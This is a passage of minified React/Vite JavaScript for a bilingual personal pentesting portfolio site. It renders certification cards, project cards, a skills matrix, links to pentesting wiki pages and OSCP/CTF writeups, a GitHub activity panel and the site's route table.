hx-btn-ghost`,children:[(0,A.jsx)(na,{}),` `,n?`Wiki de Pentesting`:`Pentesting Wiki`]}),(0,A.jsxs)(k,{to:`/contact`,className:`hx-btn hx-btn-ghost`,children:[(0,A.jsx)(Vi,{}),` `,n?`Contactar`:`Get in Touch`]})]})]}),(0,A.jsx)(`div`,{className:`bento-card bento-terminal-card`,children:(0,A.jsx)(pa,{})})]}),(0,A.jsxs)(`section`,{className:`bento-section`,children:[(0,A.jsxs)(`div`,{className:`section-head`,children:[(0,A.jsxs)(`div`,{className:`section-title-wrap`,children:[(0,A.jsxs)(`h2`,{className:`section-title`,children:[(0,A.jsx)(`span`,{className:`sec-hash`,children:`01 //`}),` `,n?`Certificaciones y Acreditaciones`:`Certifications & Credentials`]}),(0,A.jsx)(`p`,{className:`section-sub`,children:n?`Validación técnica oficial en auditorías de penetración y seguridad ofensiva`:`Official technical validation in penetration testing and offensive security`})]}),(0,A.jsxs)(k,{to:`/achievements`,className:`section-link`,children:[t(gr.viewAll),` `,(0,A.jsx)(Zi,{})]})]}),(0,A.jsx)(`div`,{className:`bento-cert-row`,children:dr.map(e=>(0,A.jsxs)(`div`,{className:`bento-card cert-showcase-card cert-${e.state}`,style:{"--cert-c":e.color},children:[(0,A.jsxs)(`div`,{className:`cert-top`,children:[(0,A.jsx)(`div`,{className:`cert-issuer-chip`,children:e.issuer}),(0,A.jsxs)(`div`,{className:`status-tag cert-status-${e.state}`,children:[(0,A.jsx)(`span`,{className:`status-dot`,"aria-hidden":`true`}),t(gr.cert[e.state])]})]}),(0,A.jsxs)(`div`,{className:`cert-main`,children:[(0,A.jsx)(`h3`,{className:`cert-title`,children:e.name}),(0,A.jsx)(`p`,{className:`cert-fullname`,children:e.full})]}),(0,A.jsx)(`div`,{className:`cert-topics`,children:e.topics?.map(e=>(0,A.jsx)(`span`,{className:`topic-chip`,children:e},e))}),(0,A.jsxs)(`div`,{className:`cert-foot`,children:[(0,A.jsx)(`span`,{className:`cert-date`,children:e.date}),e.verify&&(0,A.jsxs)(`a`,{href:e.verify,target:`_blank`,rel:`noopener noreferrer`,className:`cert-verify-link`,children:[n?`Verificar credencial`:`Verify credential`,` `,(0,A.jsx)(Gi,{})]})]})]},e.name))})]}),(0,A.jsxs)(`section`,{className:`bento-section`,children:[(0,A.jsxs)(`div`,{className:`section-head`,children:[(0,A.jsxs)(`div`,{className:`section-title-wrap`,children:[(0,A.jsxs)(`h2`,{className:`section-title`,children:[(0,A.jsx)(`span`,{className:`sec-hash`,children:`02 //`}),` `,n?`Proyectos e Infraestructura`:`Projects & Infrastructure`]}),(0,A.jsx)(`p`,{className:`section-sub`,children:n?`Laboratorios de entrenamiento, academias y despliegues defensivos`:`Training labs, academy platforms and defensive deployments`})]}),(0,A.jsxs)(k,{to:`/projects`,className:`section-link`,children:[t(gr.viewAll),` `,(0,A.jsx)(Zi,{})]})]}),(0,A.jsx)(`div`,{className:`bento-projects-grid`,children:ur.map(e=>(0,A.jsxs)(`div`,{className:`bento-card project-card`,children:[(0,A.jsxs)(`div`,{className:`project-card-header`,children:[(0,A.jsxs)(`div`,{className:`project-tag-group`,children:[(0,A.jsx)(`div`,{className:`project-initials-badge`,children:e.initials}),(0,A.jsxs)(`div`,{children:[(0,A.jsx)(`h3`,{className:`project-title`,children:e.title}),(0,A.jsx)(`span`,{className:`project-metric`,children:t(e.metrics)})]})]}),(0,A.jsxs)(`div`,{className:`status-tag status-${e.status}`,children:[(0,A.jsx)(`span`,{className:`status-dot`,"aria-hidden":`true`}),t(gr.status[e.status])]})]}),(0,A.jsx)(`p`,{className:`project-desc`,children:t(e.desc)}),(0,A.jsx)(`div`,{className:`project-tags`,children:e.tags.map(e=>(0,A.jsx)(`span`,{className:`tech-chip`,children:e},e))}),(0,A.jsxs)(`div`,{className:`project-footer`,children:[e.link&&(0,A.jsxs)(`a`,{href:e.link,target:`_blank`,rel:`noopener noreferrer`,className:`hx-btn hx-btn-sm`,children:[(0,A.jsx)(Ui,{}),` GitHub Repo`]}),(0,A.jsxs)(k,{to:`/projects`,className:`project-learn-more`,children:[n?`Detalles`:`Details`,` `,(0,A.jsx)(Zi,{})]})]})]},e.slug))})]}),(0,A.jsxs)(`section`,{className:`bento-section`,children:[(0,A.jsx)(`div`,{className:`section-head`,children:(0,A.jsxs)(`div`,{className:`section-title-wrap`,children:[(0,A.jsxs)(`h2`,{className:`section-title`,children:[(0,A.jsx)(`span`,{className:`sec-hash`,children:`03 //`}),` `,n?`Matriz de Habilidades Técnicas`:`Technical Skills Matrix`]}),(0,A.jsx)(`p`,{className:`section-sub`,children:n?`Seguridad Ofensiva, Operaciones Defensivas y Administración de Sistemas`:`Offensive Security, Defensive Operations and Systems Administration`})]})}),(0,A.jsx)(`div`,{className:`bento-skills-grid`,children:lr.map(e=>(0,A.jsxs)(`div`,{className:`bento-card skill-group-card`,style:{"--sg-color":e.color},children:[(0,A.jsxs)(`div`,{className:`skill-group-head`,children:[(0,A.jsx)(`span`,{className:`skill-group-indicator`}),(0,A.jsx)(`h3`,{className:`skill-group-title`,children:t(e.label)})]}),(0,A.jsx)(`ul`,{className:`skill-item-list`,children:e.items.map(e=>(0,A.jsxs)(`li`,{className:`skill-item`,children:[(0,A.jsx)(`span`,{className:`skill-item-bullet`,children:`›`}),(0,A.jsx)(`span`,{className:`skill-item-name`,children:e.name})]},e.name))})]},e.key))})]}),(0,A.jsx)(`section`,{className:`bento-section`,children:(0,A.jsxs)(`div`,{className:`bento-split-row`,children:[(0,A.jsxs)(`div`,{className:`bento-card wiki-quick-card`,children:[(0,A.jsxs)(`div`,{className:`wiki-card-head`,children:[(0,A.jsxs)(`div`,{children:[(0,A.jsx)(`span`,{className:`card-kicker`,children:`KNOWLEDGE BASE`}),(0,A.jsxs)(`h3`,{className:`card-title-lg`,children:[(0,A.jsx)(na,{}),` `,n?`Documentación de Pentesting`:`Pentesting Documentation`]})]}),(0,A.jsx)(k,{to:`/pentesting`,className:`hx-btn hx-btn-sm hx-btn-primary`,children:n?`Ver Todo`:`View All`})]}),(0,A.jsx)(`p`,{className:`wiki-card-desc`,children:n?`Apuntes técnicos, chuletas y metodologías de explotación recopiladas en auditorías y laboratorios.`:`Technical notes, cheat sheets, and exploitation methodologies gathered from audits and labs.`}),(0,A.jsxs)(`div`,{className:`wiki-quick-links`,children:[(0,A.jsxs)(k,{to:`/pentesting/active-directory/mapa-de-ataques`,className:`wiki-pill hot-pill`,children:[(0,A.jsx)(`span`,{className:`pulse-dot`}),` `,n?`Mapa de Ataque AD`:`AD Attack Map`]}),(0,A.jsx)(k,{to:`/pentesting/active-directory`,className:`wiki-pill`,children:`Active Directory`}),(0,A.jsx)(k,{to:`/pentesting/enumeration`,className:`wiki-pill`,children:`Enumeración`}),(0,A.jsx)(k,{to:`/pentesting/web`,className:`wiki-pill`,children:`Web Pentesting`}),(0,A.jsx)(k,{to:`/pentesting/privilege-escalation`,className:`wiki-pill`,children:`Privilege Escalation`}),(0,A.jsx)(k,{to:`/pentesting/services`,className:`wiki-pill`,children:`Servicios & Puertos`})]})]}),(0,A.jsxs)(`div`,{className:`bento-card writeups-quick-card`,children:[(0,A.jsxs)(`div`,{className:`wiki-card-head`,children:[(0,A.jsxs)(`div`,{children:[(0,A.jsx)(`span`,{className:`card-kicker`,children:`OSCP LABS & CTF`}),(0,A.jsxs)(`h3`,{className:`card-title-lg`,children:[(0,A.jsx)(M,{}),` Writeups`]})]}),(0,A.jsx)(k,{to:`/writeups`,className:`hx-btn hx-btn-sm`,children:n?`Ver Todos`:`View All`})]}),(0,A.jsx)(`div`,{className:`writeup-mini-list`,children:mr.slice(0,3).map(e=>(0,A.jsxs)(`a`,{href:e.url,target:`_blank`,rel:`noopener noreferrer`,className:`writeup-mini-item`,children:[(0,A.jsxs)(`div`,{className:`wu-mini-top`,children:[e.avatar&&(0,A.jsx)(`img`,{src:e.avatar,alt:``,className:`wu-mini-avatar-thumb`,style:{width:`24px`,height:`24px`,borderRadius:`6px`,objectFit:`cover`,border:`1px solid var(--hx-green)`}}),(0,A.jsx)(`span`,{className:`wu-platform-tag`,children:e.platform}),(0,A.jsxs)(`span`,{className:`diff-badge diff-${e.difficulty}`,children:[e.os===`windows`?(0,A.jsx)(aa,{size:10,className:`inline mr-1`}):(0,A.jsx)(oa,{size:10,className:`inline mr-1`}),e.difficulty.toUpperCase()]}),(0,A.jsxs)(`span`,{className:`wu-os-tag`,children:[e.os===`windows`?(0,A.jsx)(aa,{size:11,className:`inline mr-1`}):(0,A.jsx)(oa,{size:11,className:`inline mr-1`}),e.os.toUpperCase()]})]}),(0,A.jsx)(`h4`,{className:`wu-mini-title`,children:e.title}),(0,A.jsx)(`p`,{className:`wu-mini-summary`,children:t(e.summary)})]},e.slug))})]})]})}),(0,A.jsx)(`section`,{className:`bento-section`,children:(0,A.jsxs)(`div`,{className:`bento-card gh-activity-card`,children:[(0,A.jsxs)(`div`,{className:`section-head mb-0`,children:[(0,A.jsxs)(`div`,{className:`section-title-wrap`,children:[(0,A.jsxs)(`h2`,{className:`section-title`,children:[(0,A.jsx)(Ui,{}),` GitHub Telemetry: @bitsofalber`]}),(0,A.jsx)(`p`,{className:`section-sub`,children:n?`Actividad y repositorios públicos en tiempo real`:`Real-time public repositories and commit activity`})]}),(0,A.jsxs)(`a`,{href:sr.github,target:`_blank`,rel:`noopener noreferrer`,className:`hx-btn hx-btn-sm`,children:[`GitHub Profile `,(0,A.jsx)(Gi,{})]})]}),(0,A.jsx)(`div`,{className:`gh-embed-wrapper`,children:(0,A.jsx)(ya,{headingless:!0})})]})})]})}var xa=(0,u.lazy)(()=>h(()=>import(`./About-DBH1vEqu.js`),__vite__mapDeps([0,1]))),Sa=(0,u.lazy)(()=>h(()=>import(`./Projects-CQGSVmAI.js`),__vite__mapDeps([2,1]))),Ca=(0,u.lazy)(()=>h(()=>import(`./Achievements-BYEtbIBK.js`),__vite__mapDeps([3,1]))),wa=(0,u.lazy)(()=>h(()=>import(`./Writeups-BB8GwhqI.js`),__vite__mapDeps([4,1]))),Ta=(0,u.lazy)(()=>h(()=>import(`./Contact-y_W_SD-R.js`),__vite__mapDeps([5,1]))),Ea=(0,u.lazy)(()=>h(()=>import(`./Pentesting-DKM00yN5.js`),__vite__mapDeps([6,1,7]))),Da=(0,u.lazy)(()=>h(()=>import(`./ADAttackMap-BjmbJw2N.js`),__vite__mapDeps([8,1]))),Oa=(0,u.lazy)(()=>h(()=>import(`./NotFound-DzVJfkD5.js`),__vite__mapDeps([9,1])));function ka(){return(0,A.jsx)(ir,{children:(0,A.jsx)(Ln,{children:(0,A.jsx)(Yt,{children:(0,A.jsxs)(qt,{path:`/`,element:(0,A.jsx)(fa,{}),children:[(0,A.jsx)(qt,{index:!0,element:(0,A.jsx)(ba,{})}),(0,A.jsx)(qt,{path:`about`,element:(0,A.jsx)(xa,{})}),(0,A.jsx)(qt,{path:`projects`,element:(0,A.jsx)(Sa,{})}),(0,A.jsx)(qt,{path:`achievements`,element:(0,A.jsx)(Ca,{})}),(0,A.jsx)(qt,{path:`writeups`,element:(0,A.jsx)(wa,{})}),(0,A.jsx)(qt,{path:`pentesting`,element:(0,A.jsx)(Ea,{})}),(0,A.jsx)(qt,{path:`pentesting/:category`,element:(0,A.jsx)(Ea,{})}),(0,A.jsx)(qt,{path:`pentesting/:category/:slug`,element:(0,A.jsx)(Ea,{})}),(0,A.jsx)(qt,{path:`pentesting/active-directory/mapa-de-ataques`,element:(0,A.jsx)(Da,{})}),(0,A.jsx)(qt,{path:`contact`,element:(0,A.jsx)(Ta,{})}),(0,A.jsx)(qt,{path:`*`,element:(0,A.jsx)(Oa,{})})]})})})})}(0,d.createRoot)(document.getElementById(`root`)).render((0,A.jsx)(u.StrictMode,{children:(0,A.jsx)(ka,{})}));export{sr as A,ht as B,Ni as C,dr as D,Pi as E,mr as F,h as H,ar as I,k as L,ur as M,lr as N,fr as O,gr as P,zn as R,aa as S,Ii as T,xt as V,ia as _,Xi as a,ea as b,M as c,Qi as d,zi as f,qi as g,Vi as h,na as i,j,pr as k,Gi as l,oa as m,ua as n,Zi as o,Wi as p,$i as r,Hi as s,ya as t,Ui as u,Yi as v,Fi as w,ta as x,ra as y,Gt as z};